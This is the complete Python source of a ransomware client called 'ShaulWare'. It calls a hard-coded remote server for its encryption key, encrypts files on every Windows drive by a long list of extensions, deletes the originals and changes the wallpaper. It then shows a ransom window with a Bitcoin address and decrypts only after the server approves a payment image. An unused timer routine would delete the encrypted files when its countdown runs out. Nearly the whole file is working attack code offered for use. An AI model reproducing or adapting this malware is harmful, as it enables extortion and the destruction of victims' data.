from cryptography.fernet import Fernet
import os
import tkinter as tk
from PIL import ImageTk, Image
from tkinter import filedialog
from socket import *
import rsa
import pickle
import ctypes
import win32con
from win32 import win32api
from tkinter import Text
from datetime import datetime, timedelta
from threading import Thread, Event
import time
import sys


class Timer:
    def __init__(self, root, hours, minutes, seconds, clock):
        self.root = root
        self.hours = hours
        self.minutes = minutes
        self.seconds = seconds
        self.clock = clock
        self.clock.place(x=70, y=400)

    def start_clock(self):
        if self.hours == 0 and self.minutes == 0 and self.seconds == 1:
            for r, d, f in os.walk():
                for file in f:
                    if file.split(".")[-1] == "SHAOOLY":
                        filepath = os.path.join(r, file)
                        os.remove(filepath)
            return  # Stop timer

        self.seconds -= 1
        if self.seconds == 00:
            self.minutes -= 1
            self.seconds = 60

        if self.minutes == 00 and self.seconds == 00:
            self.hours += 1

        self.clock.config(text=f'{self.hours:02}:{self.minutes:02}:{self.seconds:02}')
        self.root.after(1000, self.start_clock)  # Call again in 1 seconds (1000ms)


class Encrypt(Thread):

    def __init__(self, cur_drive, key):
        Thread.__init__(self)
        self.drive = cur_drive
        self.fernet = Fernet(key)  # Generate a Fernet type object
        self.accepted_extensions = [
                                    "Sxw",
                                    "stw",
                                    "uot",
                                    "3ds",
                                    "max",
                                    "3dm",
                                    "ods",
                                    "ots",
                                    "der",
                                    "pfx",
                                    "key",
                                    "crt",
                                    "csr",
                                    "p12",
                                    "pem",
                                    "odt",
                                    "ott",
                                    "sxc",
                                    "stc",
                                    "dif",
                                    "slk",
                                    "wb2",
                                    "odp",
                                    "otp",
                                    "sxd",
                                    "std",
                                    "uop",
                                    "odg",
                                    "otg",
                                    "sxm",
                                    "mml",
                                    "lay",
                                    "lay6",
                                    "asc",
                                    "sqlite3",
                                    "sqlitedb",
                                    "sql",
                                    "accdb",
                                    "mdb",
                                    "dbf",
                                    "odb",
                                    "frm",
                                    "myd",
                                    "myi",
                                    "ibd",
                                    "mdf",
                                    "ldf",
                                    "sln",
                                    "suo",
                                    "cpp",
                                    "pas",
                                    "asm",
                                    "cmd",
                                    "bat",
                                    "ps1",
                                    "vbs",
                                    "dip",
                                    "dch",
                                    "sch",
                                    "brd",
                                    "jsp",
                                    "php",
                                    "asp",
                                    "java",
                                    "jar",
                                    "class",
                                    "mp3",
                                    "wav",
                                    "swf",
                                    "fla",
                                    "wmv",
                                    "mpg",
                                    "vob",
                                    "mpeg",
                                    "asf",
                                    "avi",
                                    "mov",
                                    "mp4",
                                    "3gp",
                                    "mkv",
                                    "3g2",
                                    "flv",
                                    "wma",
                                    "mid",
                                    "m3u",
                                    "m4u",
                                    "djvu",
                                    "svg",
                                    "psd",
                                    "nef",
                                    "tiff",
                                    "tif",
                                    "cgm",
                                    "raw",
                                    "gif",
                                    "png",
                                    "bmp",
                                    "jpg",
                                    "jpeg",
                                    "vcd",
                                    "iso",
                                    "backup",
                                    "zip",
                                    "vmdk",
                                    "vdi",
                                    "sldm",
                                    "sldx",
                                    "sti",
                                    "sxi",
                                    "602",
                                    "hwp",
                                    "snt",
                                    "onetoc2",
                                    "dwg",
                                    "pdf",
                                    "wk1",
                                    "wks",
                                    "123",
                                    "rtf",
                                    "csv",
                                    "txt",
                                    "vsdx",
                                    "vsd",
                                    "edb",
                                    "eml",
                                    "msg",
                                    "ost",
                                    "pst",
                                    "potm",
                                    "potx",
                                    "ppam",
                                    "ppsx",
                                    "ppsm",
                                    "pps",
                                    "pot",
                                    "pptm",
                                    "pptx",
                                    "ppt",
                                    "xltm",
                                    "xltx",
                                    "xlc",
                                    "xlm",
                                    "xlt",
                                    "xlw",
                                    "xlsb",
                                    "xlsm",
                                    "xlsx",
                                    "xls",
                                    "dotx",
                                    "dotm",
                                    "dot",
                                    "docm",
                                    "docb",
                                    "docx",
                                    "doc",
                                    "rar",
                                    "tgz",
                                    "tar",
                                    "bak",
                                    "tbk",
                                    "bz2",
                                    "PAQ",
                                    "ARC",
                                    "aes",
                                    "gpg",
                                    "vmx",
                                    ]  # List all extensions
        self.max_size = 1500000000  # A single file being over 1.5 GB is simply not ideal and would never hold important data
        self.my_files = ['cmFuc29tbm90ZQ==.txt',
                         'cmVk.png', 'eW9r.png',
                         'eW9rMg==.png', 'main.py',
                         'ransomware_server.py',
                         'README.md',
                         'Y29tcHV0ZXJfYmFja2dyb3VuZA==.jpeg',
                         'Y2xhc3MgYWxlcnQ=.PNG',
                         'Yml0Y29pbg==.png',
                         'Z3JlZW4=.png', 'main', 'main.exe']  # The files that need to run with the System.
        self.exclude = {'$Recycle.Bin', '$WinREAgent', 'Documents and Settings', 'DumpStack.log.tmp',
                        'pagefile.sys', 'PerfLogs', 'Program Files', 'Program Files (x86)', 'ProgramData', 'Recovery',
                        'swapfile.sys', 'System Volume Information', 'Windows'}

    def run(self):  # Override the Thread(run) function.
        global stop_thread
        for root, dirs, filenames in os.walk(self.drive, topdown=True):  # Start scanning a single drive
            dirs[:] = [d for d in dirs if d not in self.exclude]  # Exclude folders that shouldn't be entered.
            for file in filenames:
                if file.split(".")[-1] in self.accepted_extensions and file not in self.my_files:
                    filepath = os.path.join(root, file)
                    file_extension = file.split(".")[-1]
                    file_name = file.split(".")[0]
                    enc_file_name = f'{root}/{file_name}.SHAOOLY'
                    if os.path.getsize(filepath) < self.max_size and 'ShaulWare' not in filepath:
                        try:
                            with open(filepath, 'rb') as byte_file:
                                enc_file_content = self.fernet.encrypt(byte_file.read())
                            os.remove(filepath)
                            with open(enc_file_name, 'x') as encrypted_file:  # Encrypt
                                encrypted_file.write(file_extension + '\n' + enc_file_content.decode())
                        except FileExistsError as _fileExists:
                            index = 0
                            while True:
                                index += 1
                                try:
                                    enc_file_name = f'{root}/{file_name}({index}).SHAOOLY'
                                    with open(enc_file_name, 'x') as encrypted_file:
                                        encrypted_file.write(file_extension + '\n' + enc_file_content.decode())
                                    break
                                except FileExistsError as _fileExits:
                                    pass
                        except OSError as _OsError:
                            pass
                        except ValueError as _ValueError:
                            pass
            if stop_thread.is_set():  # Break if the Encrypting hasn't finished but the decrypting has started.
                break


class Decrypt(Thread):
    def __init__(self, cur_drive, key):
        Thread.__init__(self)
        self.drive = cur_drive
        self.fernet = Fernet(key)
        self.exclude = {'$Recycle.Bin', '$WinREAgent', 'Documents and Settings', 'DumpStack.log.tmp',
                        'pagefile.sys', 'PerfLogs', 'Program Files', 'Program Files (x86)', 'ProgramData', 'Recovery',
                        'swapfile.sys', 'System Volume Information', 'Windows'}

    def run(self):
        print(f"Started decrypting drive {self.drive}")
        for r, dirs, f in os.walk(self.drive):
            dirs[:] = [d for d in dirs if d not in self.exclude]
            for file in f:
                filepath = os.path.join(r, file)
                filename = filepath.split('/')[-1].split('.')[0]
                if filepath.split('/')[-1].split('.')[-1] == "SHAOOLY":
                    with open(filepath, 'r') as enc_file:
                        file_content = enc_file.read().split('\n')
                    ext = file_content[0]
                    file_name_with_ext = f'{filename}.{ext}'
                    try:
                        with open(file_name_with_ext, 'wb') as dec_file:
                            dec_file.write(self.fernet.decrypt(file_content[1].encode()))
                        os.remove(filepath)
                    except OSError as _osException:
                        pass


class RansomwareClient:
    def __init__(self):
        host = '212.143.57.95'
        port = 17694
        self.BUFFER_SIZE = 4096
        self.my_socket = socket()
        while True:
            try:
                self.my_socket.connect((host, port))
                break
            except Exception as N:
                time.sleep(5)  # Buffer for 5 seconds
        publickey, privatekey = rsa.newkeys(512)
        self.my_socket.send(pickle.dumps((publickey, gethostname())))
        received_key = pickle.loads(self.my_socket.recv(self.BUFFER_SIZE))
        symmetric_key = rsa.decrypt(received_key, privatekey)
        self.fernet = Fernet(symmetric_key)

    def check_deed(self, image_loc):
        if image_loc:
            with open(image_loc, 'rb') as deed_file:
                self.my_socket.send(str(os.stat(image_loc).st_size).encode())
                image_data = deed_file.read(self.BUFFER_SIZE)
                while image_data:
                    self.my_socket.send(image_data)
                    image_data = deed_file.read(self.BUFFER_SIZE)
            answer = pickle.loads(self.my_socket.recv(self.BUFFER_SIZE))
            if type(answer) is bool:
                return answer
            return False

    def get_key(self):
        self.my_socket.send(self.fernet.encrypt("sendkey".encode()))
        return self.fernet.decrypt(self.my_socket.recv(self.BUFFER_SIZE))

    def waiting(self):
        answer = self.my_socket.recv(self.BUFFER_SIZE)
        return pickle.loads(answer)


class Interface:
    def __init__(self, my_client, key):
        self.root = tk.Tk()
        self.root.title('DO NOT CLOSE THIS WINDOW')
        self.root.resizable(False, False)
        self.canvas = tk.Canvas(self.root, height=800, width=1250, bg="#841212")
        self.canvas.pack()
        self.canDecrypt = False
        self.waiting_approval = False
        self.text_list = []
        self.clock = tk.Label(self.root, height=1, background="#000000", foreground='white', font=("Lemon Milk", 20),
                              text="00:00:00")
        # self.timer = Timer(root=self.root, hours=23, minutes=59, seconds=59, clock=self.clock)
        self.client = my_client
        self.client_transaction_id = Text(self.root, height=2, width=40)
        self.KEY_SYMMETRIC = key

    def disable_event(self):
        if self.canDecrypt:
            self.root.destroy()

    def decryption_start(self):
        global stop_thread
        global waiting_approval
        if self.canDecrypt:
            stop_thread.set()
            decrypt_drives = win32api.GetLogicalDriveStrings()
            decrypt_drives = decrypt_drives.split('\000')[:-1]
            for dec_drive in decrypt_drives:
                Decrypt(dec_drive, self.KEY_SYMMETRIC).start()
            self.canvas['background'] = '#558c0d'
            self.canvas.delete('all')
            self.clock.destroy()
            self.canvas.create_image(125, 140, image=tk.PhotoImage(file="Z3JlZW4=.png"))
            for textbox in self.text_list:
                textbox.destroy()
        elif self.waiting_approval:
            self.canvas.delete('all')
            for textbox in self.text_list:
                textbox.destroy()
            self.canvas['background'] = '#1900ff'
            waiting_approval = tk.Label(self.root, text="WAITING APPROVAL \n PLEASE DO NOT CLOSE THIS WINDOW",
                                        height=10)
            waiting_approval.place(x=625, y=400, anchor='center')
            self.text_list.append(waiting_approval)
            self.canvas.update()
            approved = self.client.waiting()
            if approved:
                self.canDecrypt = True
                self.decryption_start()
            else:
                # waiting_approval.destory()
                self.canvas['background'] = '#841212'
                self.run()

    def check_deed(self):
        self.waiting_approval = self.client.check_deed(self.root.filename)
        self.decryption_start()

    def copy_address(self):
        r = tk.Tk()
        r.withdraw()
        r.clipboard_clear()
        r.clipboard_append("37fRiWcuXADrjukfXu2eaQ5k4RP99sp4Bv")
        r.destroy()

    def open_file(self):
        global my_image
        self.root.filename = filedialog.askopenfilename(title="Select A File", filetypes=[("png files", "*.png")])
        my_image = tk.PhotoImage(file=self.root.filename)
        self.canvas.create_image(750, 650, image=my_image)
        deed_button = tk.Button(self.root, text="Upload image to server", command=self.check_deed)
        deed_button.place(x=850, y=700)
        self.text_list.append(deed_button)

    def run(self):
        # INFO BOX

        with open(r'cmFuc29tbm90ZQ==.txt', 'r') as ransomnote_file:
            ransomnote = ransomnote_file.read()
        info = tk.Label(self.root, text=ransomnote, bg='white', fg='black', height=30, width=78, justify='left',
                        anchor='nw',
                        font=("Arial", 12))
        info.place(x=540, y=10)
        self.text_list.append(info)

        # DO NOT CLOSE THIS WINDOW
        do_not_close = tk.Label(self.root, text="DO NO CLOSE THIS WINDOW OR YOUR COMPUTER.\n"
                                                "IF YOU CLOSE THIS WINDOW YOU WON'T BE ABLE\n"
                                                "TO RECOVER YOUR FILES", bg='white', fg='black')
        do_not_close.place(x=0, y=550)
        self.text_list.append(do_not_close)

        # YOK
        yok = tk.PhotoImage(file="eW9r.png")
        self.canvas.create_image(400, 180, image=yok)

        # YOK2
        yok2 = tk.PhotoImage(file="eW9rMg==.png")
        self.canvas.create_image(400, 540, image=yok2)

        # UPLOAD A FILE
        upload_file = tk.Button(self.root, text="Choose file to upload", command=self.open_file)
        upload_file.pack()
        self.text_list.append(upload_file)

        self.root.protocol("WM_DELETE_WINDOW", self.disable_event)
        self.root.mainloop()


def set_wallpaper(path):
    try:
        changed = win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE
        ctypes.windll.user32.SystemParametersInfoA(win32con.SPI_SETDESKWALLPAPER, 0, path.encode(), changed)
    except Exception as N:
        pass


if __name__ == "__main__":
    # time.sleep(60)
    stop_thread = Event()
    client = RansomwareClient()
    SYMMETRIC_KEY = client.get_key()
    if not os.path.exists('16jXldem15Qg15zXqdeq15XXqj8g16rXkdeZ15Ag15HXnNeV15LXlAo=.SHAOOLY'):
        try:
            with open('16jXldem15Qg15zXqdeq15XXqj8g16rXkdeZ15Ag15HXnNeV15LXlAo=.SHAOOLY', 'x') as check:
                check.write('15TXmdeQINeR15DXlCDXnNeR15zXldeqINeQ16DXmSDXqNeV15DXlCDXnNeUINeR16LXmdeg15nXmdedINeR15DXlCDXot'
                            'edINei15XXkyDXkNeo15HXoiDXl9eR16jXldeqINee15LXkdei16rXmdeZ150g16nXqteq15Qg15nXldeq16gg157Xk9eZ'
                            'INeV15TXmdeQINem16jXmdeb15Qg16fXpteqINee15nXnSDXm9eV15zXnSDXm9eR16gg15nXldeT16LXmdedINep15TXmd'
                            'eQINec15Ag16nXnteUINeq16nXldee16og15zXkSDXm9eT15DXmSDXqdeq16nXkSDXnNeQINee16HXldeSINeU15HXl9eV'
                            '16jXldeqINep15nXqdeZ157XlSDXnNeaINei15XXp9eR')
        except PermissionError as _PermissionError:
            pass
        drives = win32api.GetLogicalDriveStrings()
        drives = drives.split('\000')[:-1]
        for drive in drives:
            t = Encrypt(drive, SYMMETRIC_KEY)
            t.start()
        t.join()
        set_wallpaper("Y29tcHV0ZXJfYmFja2dyb3VuZA==.jpeg")
    my_interface = Interface(client, SYMMETRIC_KEY)
    my_interface.run()  # NOTE: The interface will be started last.

    # change the wallpaper to scare the user.

